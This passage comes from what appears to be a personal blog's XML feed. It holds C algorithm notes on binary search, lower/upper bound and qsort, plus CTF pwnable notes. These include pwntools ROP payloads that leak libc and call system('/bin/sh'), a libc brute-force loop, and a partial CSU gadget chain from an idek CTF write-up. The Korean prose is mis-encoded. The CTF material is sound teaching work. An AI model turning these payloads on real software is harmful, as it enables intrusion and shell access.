ìˆ«ìžì¹´ë“œ 2)"></a>Example (ë°±ì¤€ 10816 ìˆ«ìžì¹´ë“œ 2)</h2><ul><li><a href="https://www.acmicpc.net/problem/10816">https://www.acmicpc.net/problem/10816</a></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">compare</span><span class="params">(<span class="type">const</span> <span class="type">void</span>* a, <span class="type">const</span> <span class="type">void</span>* b)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (*(<span class="type">int</span>*)a &gt; *(<span class="type">int</span>*)b) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (*(<span class="type">int</span>*)a &lt; *(<span class="type">int</span>*)b) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">lower_bound</span><span class="params">(<span class="type">int</span> data[], <span class="type">int</span> n, <span class="type">int</span> key)</span> &#123;</span><br><span class="line">    <span class="type">int</span> low, high, mid;</span><br><span class="line"></span><br><span class="line">    low = <span class="number">0</span>;</span><br><span class="line">    high = n<span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (low &lt; high) &#123;</span><br><span class="line">        mid = (low+high) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (key &lt;= data[mid]) </span><br><span class="line">            high = mid;</span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">            low = mid + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> high;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">upper_bound</span><span class="params">(<span class="type">int</span> data[], <span class="type">int</span> n, <span class="type">int</span> key)</span> &#123;</span><br><span class="line">    <span class="type">int</span> low, high, mid;</span><br><span class="line"></span><br><span class="line">    low = <span class="number">0</span>;</span><br><span class="line">    high = n<span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (low &lt; high) &#123;</span><br><span class="line">        mid = (low+high) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (key &lt; data[mid]) </span><br><span class="line">            high = mid;</span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">            low = mid + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (data[high] == key) </span><br><span class="line">        <span class="keyword">return</span> high + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> high;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="type">int</span> arr[n];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d &quot;</span>, &amp;arr[i]);</span><br><span class="line"></span><br><span class="line">    qsort(arr, n, <span class="keyword">sizeof</span>(<span class="type">int</span>), compare);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;m);</span><br><span class="line">    <span class="type">int</span> brr[m];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++)</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d &quot;</span>, &amp;brr[i]);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// lower_bound, upper_bound</span></span><br><span class="line">    <span class="type">int</span> lower, upper;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">        lower = lower_bound(arr, n, brr[i]);</span><br><span class="line">        upper = upper_bound(arr, n, brr[i]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, upper-lower);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ì´ ë¬¸ì œë¥¼ í’€ê¸° ìœ„í•´ì„œ <code>upper_bound</code> í•¨ìˆ˜ì—ì„œ ì•„ëž˜ ì¡°ê±´ì„ ì¶”ê°€í•´ì¤˜ì•¼í•œë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (data[high] == key) </span><br><span class="line">    <span class="keyword">return</span> high + <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>ì™œëƒí•˜ë©´.. <code>upper_bound</code> í•¨ìˆ˜ì˜ ë°˜í™˜ ê°’ì€ key ê°’ì„ ì´ˆê³¼í•˜ëŠ” ì²« ë²ˆì§¸ ê°’ì˜ ì¸ë±ìŠ¤ì¸ë° keyê°€ ì •ë ¬ì—ì„œ ê°€ìž¥ í° ìˆ˜ë¼ë©´ ë°˜í™˜ ê°’ì´ ì¡´ìž¬í•˜ì§€ ì•Šê¸° ë–„ë¬¸ì´ë‹¤. ê·¸ëž˜ì„œ n-1ì„ ë°˜í™˜í•œë‹¤. ì´ ë¬¸ì œëŠ” keyì˜ ê°œìˆ˜ë¥¼ ì•Œì•„ë‚´ëŠ” ê²ƒì´ ëª©í‘œì´ê¸° ë•Œë¬¸ì— í•´ë‹¹ ê²½ìš°ì—ë§Œ +1ì„ í•´ì¤˜ì•¼ í•œë‹¤. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10 20 30 30 30 </span><br></pre></td></tr></table></figure><p>ì˜ˆì‹œë¡œ ìœ„ì˜ ë°°ì—´ì—ì„œ 30ì˜ ê°œìˆ˜ëŠ” <code>5-2 = 3</code> ì´ì–´ì•¼ í•œë‹¤.</p>]]></content>
      
      
      <categories>
          
          <category> Docs </category>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
            <tag> binsearch </tag>
            
            <tag> Baekjoon </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Algorithm - Binary Search (C)</title>
      <link href="/230123-alrorithm-binsearch/"/>
      <url>/230123-alrorithm-binsearch/</url>
      
        <content type="html"><![CDATA[<ul><li>ì •ë ¬ëœ ë°°ì—´ì— ëŒ€í•´ ì‚¬ìš© ê°€ëŠ¥</li></ul><h2 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">compare</span><span class="params">(<span class="type">const</span> <span class="type">void</span>* a, <span class="type">const</span> <span class="type">void</span>* b)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (*(<span class="type">int</span>*)a &gt; *(<span class="type">int</span>*)b) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (*(<span class="type">int</span>*)a &lt; *(<span class="type">int</span>*)b) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">binsearch</span><span class="params">(<span class="type">int</span> data[], <span class="type">int</span> n, <span class="type">int</span> key)</span> &#123;</span><br><span class="line">    <span class="type">int</span> low, high, mid;</span><br><span class="line"></span><br><span class="line">    low = <span class="number">0</span>;</span><br><span class="line">    high = n<span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (low &lt;= high) &#123;</span><br><span class="line">        mid = (low+high) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (key == data[mid]) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (key &lt; data[mid]) high = mid<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (key &gt; data[mid]) low = mid+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n, key;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="type">int</span> arr[n];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;arr[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    qsort(arr, n, <span class="keyword">sizeof</span>(<span class="type">int</span>), compare);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, arr[j]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;key);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nfind key: %s\n&quot;</span>, binsearch(arr, n, key) ? <span class="string">&quot;Exist&quot;</span> : <span class="string">&quot;None&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>input</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">10</span><br><span class="line">9 2 6 5 1 7 3 4 8 1</span><br><span class="line">5</span><br></pre></td></tr></table></figure><ul><li>output</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1 1 2 3 4 5 6 7 8 9 </span><br><span class="line">find key: Exist</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Docs </category>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
            <tag> binsearch </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Algorithm - Quick sort (C, qsort)</title>
      <link href="/230123-algorithm-qsort/"/>
      <url>/230123-algorithm-qsort/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void qsort (void *base, size_t nel, size_t width, int (*compare)(const void *, const void *);</span><br></pre></td></tr></table></figure><ul><li><code>stdlib.h</code></li><li><code>O(nlogn)</code> (ìµœì•…: <code>O(n^2)</code>)</li></ul><h2 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">compare</span><span class="params">(<span class="type">const</span> <span class="type">void</span>* a, <span class="type">const</span> <span class="type">void</span>* b)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (*(<span class="type">int</span>*)a &gt; *(<span class="type">int</span>*)b) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (*(<span class="type">int</span>*)a &lt; *(<span class="type">int</span>*)b) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="type">int</span> arr[n];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;arr[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    qsort(arr, n, <span class="keyword">sizeof</span>(<span class="type">int</span>), compare);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, arr[j]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>input</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">10</span><br><span class="line">9 2 6 5 1 7 3 4 8 1</span><br></pre></td></tr></table></figure><ul><li>output</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 1 2 3 4 5 6 7 8 9</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Docs </category>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
            <tag> qsort </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwnable - 32bit ROP</title>
      <link href="/230119-pwn-32bitrop/"/>
      <url>/230119-pwn-32bitrop/</url>
      
        <content type="html"><![CDATA[<ul><li>x86 calling convention<ul><li>The caller places all arguments to the callee on the <code>stack</code></li><li>Arguments are pushed to the <code>stack</code></li><li>Stack cleanup is performed by the calle<br></li></ul></li><li>rip control</li><li><code>/bin/sh\x00</code> address</li><li>leak the libc address. (e.g <code>got</code>)</li><li>got overwriting</li><li>argument control? -&gt; <code>pop [reg] ; ret</code> gadget address (Role is to add <code>esp</code>)</li></ul><h2 id="Libc-Leak"><a href="#Libc-Leak" class="headerlink" title="Libc Leak"></a>Libc Leak</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x88</span>+<span class="number">0x4</span>) <span class="comment"># (dummy + ebp)</span></span><br><span class="line"></span><br><span class="line">payload += p32(e.plt[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line">payload += p32(pppr)</span><br><span class="line">payload += p32(<span class="number">1</span>)</span><br><span class="line">payload += p32(e.got[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line">payload += p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">payload += p32(e.sym[<span class="string">&#x27;main&#x27;</span>]) <span class="comment"># ret2main</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input:\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">leak = struct.unpack(<span class="string">&#x27;I&#x27;</span>, p.recv(<span class="number">4</span>))[<span class="number">0</span>] </span><br><span class="line">info(<span class="built_in">hex</span>(leak))</span><br></pre></td></tr></table></figure><h2 id="Execute-system-39-bin-sh-x00-39"><a href="#Execute-system-39-bin-sh-x00-39" class="headerlink" title="Execute system(&#39;/bin/sh\x00&#39;)"></a>Execute <code>system(&#39;/bin/sh\x00&#39;)</code></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># restart main</span></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x88</span>+<span class="number">0x4</span>) <span class="comment"># (dummy + ebp)</span></span><br><span class="line"></span><br><span class="line">payload += p32(system)</span><br><span class="line">payload += <span class="string">b&#x27;B&#x27;</span> * <span class="number">0x4</span></span><br><span class="line">payload += p32(binsh)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input:\n&#x27;</span>, payload)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Docs </category>
          
          <category> Pwnable </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 32bit </tag>
            
            <tag> rop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwnable - libc brute forcing in local (p.libcs())</title>
      <link href="/230119-pwn-libc_brute_forcing_in_local/"/>
      <url>/230119-pwn-libc_brute_forcing_in_local/</url>
      
        <content type="html"><![CDATA[<ul><li>ë¡œì»¬ì—ì„œ ì›í•˜ëŠ” ë¦½ì‹œ ì£¼ì†Œ ì‹¤í–‰í•  ë•Œê¹Œì§€ íŠ¹ì • ë°”ì´íŠ¸ ë¸Œë£¨íŠ¸ í¬ì‹±í•˜ê¸°<ul><li><code>p.libcs()</code> ì´ìš©</li></ul></li><li>ìƒí™©<ul><li>8ë°”ì´íŠ¸ ì¤‘ ìƒìœ„ 5ë°”ì´íŠ¸ëŠ” ì•Œê³  ìžˆê³ , í•˜ìœ„ 1.5ë°”ì´íŠ¸ëŠ” ì˜¤í”„ì…‹ìœ¼ë¡œ ì•Œê³  ìžˆëŠ” ìƒí™©. í•˜ì§€ë§Œ ì¤‘ê°„ 1.5ë°”ì´íŠ¸ë¥¼ ëª¨ë¥´ê¸° ë•Œë¬¸ì— í•´ë‹¹ ë¶€ë¶„ ë¸Œë£¨íŠ¸ í¬ì‹±ì´ í•„ìš”í•¨ -&gt; <code>0x7fb877 ??? b01</code></li></ul></li><li>ìž¥ì <ul><li>ì •ë‹µì¸ ì£¼ì†Œë§Œì„ ì´ìš©í•˜ì—¬ íŽ˜ì´ë¡œë“œë¥¼ ì „ì†¡í•˜ê¸° ë•Œë¬¸ì— ë””ë²„ê¹… ì‹œ ìœ ë¦¬í•¨ (ë¹ ë¦„)</li></ul></li></ul><h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p = process(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">repr</span>(p.libs())) <span class="comment"># print base</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(p.libs()[<span class="string">&#x27;/home/jir4vvit/ctf/idek/sprinter/libc.so.6&#x27;</span>] + <span class="number">0xe3b01</span>))</span><br><span class="line"></span><br><span class="line">        aslr = <span class="built_in">hex</span>(p.libs()[<span class="string">&#x27;/home/jir4vvit/ctf/idek/sprinter/libc.so.6&#x27;</span>] + <span class="number">0xe3b01</span>)[-<span class="number">6</span>:-<span class="number">3</span>] <span class="comment"># 0x7fb877 210 b01 -&gt; only get &#x27;210&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> aslr != <span class="string">&#x27;fff&#x27;</span>:</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># exploit code here !!</span></span><br><span class="line">        <span class="comment"># break</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br></pre></td></tr></table></figure><ul><li>ì¶œë ¥ ê²°ê³¼</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&#x27;/home/jir4vvit/ctf/idek/sprinter/vuln&#x27;</span>: 4190208, <span class="string">&#x27;/home/jir4vvit/ctf/idek/sprinter/libc.so.6&#x27;</span>: 140430248431616, <span class="string">&#x27;/home/jir4vvit/ctf/idek/sprinter/ld-2.31.so&#x27;</span>: 140430250479616&#125;</span><br><span class="line">0x7fb877210b01</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Docs </category>
          
          <category> Pwnable </category>
          
      </categories>
      
      
        <tags>
            
            <tag> libc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>idek CTF 2023 - Typop (intend, CSU)</title>
      <link href="/230118-idekctf2023-typop2/"/>
      <url>/230118-idekctf2023-typop2/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1839">https://ctftime.org/event/1839</a></li></ul><p>ì–¼ë§ˆ ì „ì— ì˜¬ë ¸ë˜ idek CTFì—ì„œì˜ Typop ë¬¸ì œë¥¼ ì–¸ì¸í…ìœ¼ë¡œ í’€ì´í–ˆë‹¤ëŠ” ê²ƒì„ í™•ì¸í–ˆë‹¤. ctftime êµ¬ê²½í•˜ë‹¤ê°€ ì´ ë¬¸ì œì˜ ë‹¤ë¥¸ í’€ì´ë¥¼ í™•ì¸í•˜ë©´ì„œ ì•Œê²Œë˜ì—ˆë‹¤. ë‹¹ì‹œì—” ê¸¸ì´ ì œí•œ ë•Œë¬¸ì— <code>csu gadget</code>ì„ ì‚¬ìš© ëª»í•œë‹¤ê³  ìƒê°í–ˆë‹¤. í•˜ì§€ë§Œ ì“¸ë° ì—†ëŠ” íŽ˜ì´ë¡œë“œê°€ ìžˆì—ˆê³  ì´ê²ƒë§Œ ì—†ìœ¼ë©´ ê¸¸ì´ê°€ ë”± ë§žì•„ì„œ <code>csu gadget</code>ì„ ì‚¬ìš©í•˜ì—¬ <code>win</code> í•¨ìˆ˜ë¥¼ ì‹¤í–‰í•  ìˆ˜ ìžˆë‹¤.</p><p>ì´ ë¬¸ì œì— ëŒ€í•œ ì •ë³´ì™€ ë¶„ì„ì€ ë©°ì¹  ì „ ìž‘ì„±í•œ ê²Œì‹œê¸€ì„ í™•ì¸í•˜ìž.</p><ul><li><a href="https://jiravvit.github.io/230116-idekctf2023-typop/">https://jiravvit.github.io/230116-idekctf2023-typop/</a></li></ul><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><h3 id="csu-int-csu-call"><a href="#csu-int-csu-call" class="headerlink" title="csu_int, csu_call"></a>csu_int, csu_call</h3><img src="/images/230118-idekctf2023-typop2/Screenshot 2023-01-18 at 17.17.11.png" width=700/><br><p>ìœ„ ì‚¬ì§„ì˜ ê°€ì ¯ì„ ì‚¬ìš©í•˜ì—¬ ë§Œë“  í•¨ìˆ˜ëŠ” ì•„ëž˜ì™€ ê°™ë‹¤.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">chain</span>(<span class="params">rdi, rsi, rdx, buf, csu_call</span>):</span><br><span class="line">    payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="comment">#payload += b&#x27;A&#x27; * 8        # add rsp, 8</span></span><br><span class="line">    payload += p64(<span class="number">0</span>)           <span class="comment"># pop rbx (dummy)</span></span><br><span class="line">    payload += p64(<span class="number">1</span>)           <span class="comment"># pop rbp (dummy)</span></span><br><span class="line">    payload += p64(rdi)         <span class="comment"># pop r12 -&gt; rdi</span></span><br><span class="line">    payload += p64(rsi)         <span class="comment"># pop r13 -&gt; rsi</span></span><br><span class="line">    payload += p64(rdx)         <span class="comment"># pop r14 -&gt; rdx    </span></span><br><span class="line">    payload += p64(buf)         <span class="comment"># pop r15 -&gt; call [buf]</span></span><br><span class="line">    payload += p64(csu_call)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure><p>ì½”ë“œì— ì£¼ì„ìœ¼ë¡œ í‘œí˜„ë˜ì–´ ìžˆëŠ” ë¶€ë¶„ì´ ë°”ë¡œ ì“¸ë°ì—†ëŠ” íŽ˜ì´ë¡œë“œì´ë‹¤. ì´ ë¬¸ì œì—ì„œ ì € ì½”ë“œëŠ” í•„ìš” ì—†ë‹¤.</p><p>í•œíŽ¸, <code>csu gadget</code>ì„ ì‚¬ìš©í•˜ê¸° ìœ„í•´ ê°€ìž¥ ì¤‘ìš”í•œ ê²ƒì€ callí•  ì£¼ì†Œê°€ í•„ìš”í•˜ë‹¤ëŠ” ê²ƒì´ë‹¤. ì‚¬ì§„ì˜ ì½”ë“œì—ì„  <code> call [r15+rbx*8]</code>ê°€ ì—¬ê¸°ì— í•´ë‹¹í•œë‹¤. 